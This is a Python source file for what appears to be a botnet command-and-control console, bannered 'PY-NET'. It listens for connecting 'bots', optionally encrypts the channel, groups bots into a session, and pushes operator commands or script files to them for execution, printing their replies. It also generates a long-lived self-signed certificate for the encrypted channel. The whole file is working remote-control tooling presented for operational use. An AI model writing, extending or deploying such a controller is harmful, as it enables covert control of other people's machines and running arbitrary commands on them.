import subprocess
import threading
import argparse
import uuid
import sys
import os

from typing import Generator
from typing import Sequence
from typing import Optional
from typing import Union
from typing import Tuple
from typing import Dict
from typing import Any

from shared import DEFAULT_HOSTNAME
from shared import DEFAULT_PORT
from shared import DEFAULT_ENCODING
from shared import STRICT_ENCODING_ERRORS
from shared import Platform
from shared import AsymmetricSocket
from shared import SymmetricSocket
from shared import Socket

hosts = {}

class Console:

    if Platform.UNIX:
        ANSI_RED = '\033[31'
        ANSI_GREEN = '\033[32'
        ANSI_YELLOW = '\033[33'
        ANSI_BLUE = '\033[34'
        ANSI_PURPLE = '\033[35'
        ANSI_CYAN = '\033[36'
        ANSI_WHITE = '\033[37'
        ANSI_RESET = '\033[39m'
    else:
        ANSI_RED = ''
        ANSI_GREEN = ''
        ANSI_YELLOW = ''
        ANSI_BLUE = ''
        ANSI_PURPLE = ''
        ANSI_CYAN = ''
        ANSI_WHITE = ''
        ANSI_RESET = ''

    INFO = f'{ANSI_BLUE}[*]{ANSI_RESET} '
    SUCCESS = f'{ANSI_GREEN}[+]{ANSI_RESET} '
    WARNING = f'{ANSI_YELLOW}[!]{ANSI_RESET} '
    DANGER = f'{ANSI_RED}[-]{ANSI_RESET} '
    NULL = ''

    @staticmethod
    def write(
        obj: Any,
        prefix: str=INFO,
        *,
        color: str=ANSI_WHITE,
        suffix: str='',
        **kwargs
    ) -> None:
        print(f'{prefix}{color}{obj}{Console.ANSI_RESET}{suffix}\n', **kwargs)

    @staticmethod
    def table(
        rows: Sequence,
        *,
        headers: Sequence,
        prefix: str='',
        suffix: str='',
        separator: str='-',
        margin: str='  '
    ) -> str:
        column_lengths = []
        result = [prefix]

        for header in headers:
            column_lengths.append([len(str(header))])

        for row in rows:
            for index, column in enumerate(row):
                column_lengths[index].append(len(str(column)))
        else:
            max_column_lengths = []

            for column_length in column_lengths:
                max_column_lengths.append(max(column_length))

        for index, header in enumerate(headers):
            result.append(str(header).ljust(max_column_lengths[index]) + margin)
        else:
            result.append('\n')

        for max_column_length in max_column_lengths:
            result.append(max_column_length * separator + margin)
        else:
            result.append('\n')

        for row in rows:
            for index, column in enumerate(row):
                result.append(str(column).ljust(max_column_lengths[index]) + margin)
            else:
                result.append('\n')
        else:
            result.append(suffix)
            return ''.join(result)

    @staticmethod
    def banner() -> str:
        return ('-----------------------------------------------          __     \n'
                '  _____ __     __       _   _  ______  _______      w  c(..)o   (\n'
                ' |  __ \\\\ \   / /      | \ | ||  ____||__   __|      \__(-)    __)\n'
                ' | |__) |\ \_/ /______ |  \| || |__      | |             /\   (\n'
                ' |  ___/  \   /|______|| . ` ||  __|     | |            /(_)___)\n'
                ' | |       | |         | |\  || |____    | |           w /|\n'
                ' |_|       |_|         |_| \_||______|   |_|            | \\\n'
                '-----------------------------------------------        m  m')

class Action:

    @staticmethod
    def args(*args, **kwargs) -> Generator[Any, None, None]:
        for arg, cast, default in args:
            if cast is bool:
                yield kwargs.get(arg) is not None
            else:
                value = kwargs.get(arg, default)

                if value == default:
                    yield value
                else:
                    yield cast(value)

    @staticmethod
    def exit(_) -> None:
        Console.write('May we meet in another process...', Console.NULL, end=Console.NULL)
        sys.exit()

    @staticmethod
    def cls(_) -> None:
        if Platform.UNIX:
            os.system('clear')
        else:
            os.system('cls')

    @staticmethod
    def list(_) -> None:
        if len(hosts) > 0:
            rows = []

            for host_id, host in hosts.items():
                rows.append((host_id, *host.host.address()))

                for bot_id, bot in host.bots.items():
                    rows.append((bot_id, *bot.address()))
            else:
                table = Console.table(rows, headers=host.host.address_headers())
                Console.write(table, Console.NULL, end=Console.NULL)
        else:
            Console.write('NO HOSTS RUNNING', Console.WARNING)

    @staticmethod
    def listen(args: Dict[str, str]) -> None:
        hostname, port, password, salt, pubk, privk = Action.args(('hostname', str, DEFAULT_HOSTNAME),
                                                                  ('port', int, DEFAULT_PORT),
                                                                  ('password', str, None),
                                                                  ('salt', str, None),
                                                                  ('pubk', str, None),
                                                                  ('privk', str, None),
                                                                  **args)

        if password and salt:
            options = {'symmetric': True, 'password': password, 'salt': salt}
        elif pubk and privk:
            options = {'symmetric': False, 'public_key': pubk, 'private_key': privk}
        else:
            options = {}

        host = Host(hostname, port, **options)

        if host.host.conn is None:
            Console.write('HOST NOT STARTED', Console.DANGER)
        else:
            host_id = str(uuid.uuid4())
            hosts[host_id] = host
            threading.Thread(target=host.listen, args=(host_id,), daemon=True).start()
            Console.write(f'HOST STARTED :: {host.host}', Console.SUCCESS)

    @staticmethod
    def who(args: Dict[str, str]) -> None:
        id, = Action.args(('id', str, None), **args)

        assert id, f'Missing attribute: {id=}'

        who_conn = None

        for host_id, host in hosts.items():
            if host_id == id:
                who_conn = host.host; break
            else:
                if id in host.bots:
                    who_conn = host.bots[id]; break

        if who_conn is None:
            Console.write(f'NO MATCHING ID FOUND :: {id}', Console.WARNING)
        else:
            rows, headers = who_conn.detailed_address()
            table = Console.table(rows, headers=headers)
            Console.write(table, Console.NULL, end=Console.NULL)

    @staticmethod
    def close(args: Dict[str, str]) -> None:
        id, = Action.args(('id', str, None), **args)

        assert id, f'Missing attribute: {id=}'

        conn_ids = [id.strip() for id in id.split(',') if id]

        for host_id, host in hosts.copy().items():
            if host_id in conn_ids:
                for bot_id, bot in host.bots.copy().items():
                    Action._close_conn(bot_id, bot, host.bots)
                else:
                    Action._close_conn(host_id, host.host, hosts); conn_ids.remove(host_id)
                    Console.write(f'HOST CLOSED :: {host_id}', Console.SUCCESS, end=Console.NULL)
            else:
                for bot_id, bot in host.bots.copy().items():
                    if bot_id in conn_ids:
                        Action._close_conn(bot_id, bot, host.bots); conn_ids.remove(bot_id)
                        Console.write(f'BOT CLOSED :: {bot_id}', Console.SUCCESS, end=Console.NULL)
        else:
            for conn_id in conn_ids:
                Console.write(f'NO MATCHING ID FOUND :: {conn_id}', Console.DANGER, end=Console.NULL)
            else:
                print()

    @staticmethod
    def session(args: Dict[str, str]) -> None:
        id, remove = Action.args(('id', str, None), ('remove', bool, None), **args)
    
        assert id, f'Missing attribute: {id=}'

        conn_ids = [id.strip() for id in id.split(',') if id]

        for host in hosts.values():
            for conn_id in conn_ids:
                if conn_id in host.bots:
                    bot = host.bots[conn_id]
                    conn_ids.remove(conn_id)

                    if bot.in_session:
                        if remove:
                            bot.in_session = False
                            Console.write(f'BOT REMOVED FROM SESSION :: {id}', Console.SUCCESS, end=Console.NULL)
                        else:
                            Console.write(f'BOT ALREADY IN SESSION :: {id}', Console.WARNING, end=Console.NULL)
                    else:
                        if remove:
                            Console.write(f'BOT NOT IN SESSION :: {id}', Console.WARNING, end=Console.NULL)
                        else:
                            bot.in_session = True
                            Console.write(f'BOT JOINED SESSION :: {id}', Console.SUCCESS, end=Console.NULL)
        else:
            for conn_id in conn_ids:
                Console.write(f'BOT NOT FOUND :: {conn_id}', Console.DANGER, end=Console.NULL)
            else:
                print()

    @staticmethod
    def _close_conn(
        conn_id: str,
        conn: Union[Socket, SymmetricSocket, AsymmetricSocket],
        del_from: Dict[str, Union[Socket, SymmetricSocket, AsymmetricSocket]]
    ) -> None:
        conn.close()

        try:
            del del_from[conn_id]
        except KeyError:
            pass
class Parse:

    COMMANDS = (('exit', Action.exit),
                ('cls', Action.cls),
                ('list', Action.list),
                ('listen', Action.listen),
                ('who', Action.who),
                ('close', Action.close),
                ('session', Action.session))

    def input(self) -> None:
        Console.write(Console.banner(), Console.NULL, color=Console.ANSI_YELLOW)

        while True:
            try:
                command, args = self._parse()
                found_command = False

                for match, callback in self.COMMANDS:
                    if command == match:
                        callback(args)
                        found_command = True; break

                if not found_command:
                    run, filepath, history = Action.args(('run', bool, None),
                                                         ('filepath', str, None),
                                                         ('history', bool, None),
                                                         **args)

                    assert isinstance(run, bool), f'Wrong type: {run=}'
                    assert isinstance(filepath, str) or filepath is None, f'Wrong type: {filepath=}'
                    assert isinstance(history, bool), f'Wrong type: {history=}'

                    if filepath:
                        with open(filepath,
                                  'r',
                                  encoding=DEFAULT_ENCODING,
                                  errors=STRICT_ENCODING_ERRORS) as rf:
                            command = rf.read()

                    for host in hosts.values():
                        for bot_id, bot in host.bots.items():
                            if bot.in_session:
                                try:
                                    request = {'request': command, 'run': run}

                                    if history:
                                        bot.send(request, self._send_callback)
                                        response = bot.recv(self._recv_callback)
                                    else:
                                        bot.send(request)
                                        response = bot.recv()
                                except Exception:
                                    Action._close_conn(bot_id, bot, host.bots)
                                    raise
                                else:
                                    response_text = response.get('response')

                                    if response_text:
                                        Console.write(response_text, Console.NULL)
                                    else:
                                        Console.write('Empty Response', Console.WARNING)
            except Exception as err:
                Console.write(f'[HOST] ERROR :: {err}', Console.NULL)

    def _parse(self) -> Tuple[str, Dict[str, str]]:
        try:
            command, *args = input('>>> ').split('--')
        except (EOFError, KeyboardInterrupt):
            sys.exit()
        else:
            return (command.strip(), dict(self._parse_args(args)))

    def _parse_args(self, args: Sequence) -> Generator[Tuple[str, str], None, None]:
        for arg in args:
            arg = arg.strip()

            if arg:
                key, *value = arg.split(' ')
                yield (key.rstrip(), ' '.join(value).lstrip())

    @staticmethod
    def _send_callback(header_size: str, body_size: str, message_size: str) -> None:
        assert isinstance(header_size, str), f'Wrong type: {header_size=}'
        assert isinstance(body_size, str), f'Wrong type: {body_size=}'
        assert isinstance(message_size, str), f'Wrong type: {message_size=}'

        table = Console.table(((header_size, body_size, message_size),),
                                headers=('Header Size', 'Body Size', 'Message Size'))
        Console.write(table, Console.NULL, end=Console.NULL)

    @staticmethod
    def _recv_callback(history: Sequence) -> None:
        assert isinstance(history, (list, tuple)), f'Wrong type: {history=}'

        table = Console.table(history, headers=('Buffer Size',
                                                'Received Data',
                                                'Message Size'))
        Console.write(table, Console.NULL, end=Console.NULL)

class Host:

    def __init__(
        self,
        *args,
        symmetric: Optional[bool]=None,
        timeout: Union[int, float]=120,
        **kwargs
    ) -> None:
        assert isinstance(symmetric, bool) or symmetric is None, f'Wrong type: {symmetric=}'
        assert isinstance(timeout, (int, float)), f'Wrong type: {timeout=}'

        self.symmetric = symmetric
        self.timeout   = timeout
        self.args      = args
        self.kwargs    = kwargs
        self.bots      = {}

        if self.symmetric is None:
            self.host = Socket(*self.args, server_side=True, is_host=True)
            self.host.set_conn()
            self.host.set_context()
        elif self.symmetric:
            self.host = SymmetricSocket(*self.args, server_side=True, is_host=True, **self.kwargs)
            self.host.set_conn()
            self.host.set_context()
        else:
            self.host = AsymmetricSocket(*self.args, server_side=True, is_host=True, **self.kwargs)
            self.host.set_conn()
            self.host.set_context()
            self.host.set_middleware()

    def listen(self, host_id: str) -> None:
        try:
            with self.host.conn as host_conn:
                while True:
                    try:
                        bot_conn, (ip, port) = host_conn.accept()
                    except OSError:
                        continue

                    bot_conn.settimeout(self.timeout)

                    if self.symmetric is None:
                        bot_conn = Socket(ip, port, conn=bot_conn, server_side=True)
                        bot_conn.set_context()
                        bot_conn.set_middleware()
                    elif self.symmetric:
                        bot_conn = SymmetricSocket(ip, port, conn=bot_conn, server_side=True, **self.kwargs)
                        bot_conn.set_context()
                        bot_conn.set_middleware()
                    else:
                        bot_conn = AsymmetricSocket(ip, port, conn=bot_conn, server_side=True, **self.kwargs)
                        bot_conn.set_context()

                    self.bots[str(uuid.uuid4())] = bot_conn
        except Exception:
            for bot_id, bot in self.bots.copy().items():
                Action._close_conn(bot_id, bot, self.bots)
            else:
                Action._close_conn(host_id, self.host.conn, hosts)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--pubk_out')
    parser.add_argument('--privk_out')
    args = parser.parse_args()

    if args.pubk_out and args.privk_out:
        proc = subprocess.run(('openssl',
                               'req',
                               '-newkey',
                               'rsa:2048',
                               '-nodes',
                               '-keyout',
                               args.privk_out,
                               '-x509',
                               '-days',
                               '36500',
                               '-out',
                               args.pubk_out,
                               '-batch'),
                              encoding=DEFAULT_ENCODING,
                              errors=STRICT_ENCODING_ERRORS,
                              stdin=subprocess.DEVNULL,
                              stdout=subprocess.DEVNULL,
                              stderr=subprocess.DEVNULL)

        assert proc.returncode == 0, f'Wrong value: {proc.returncode=}'
    else:
        Parse().input()
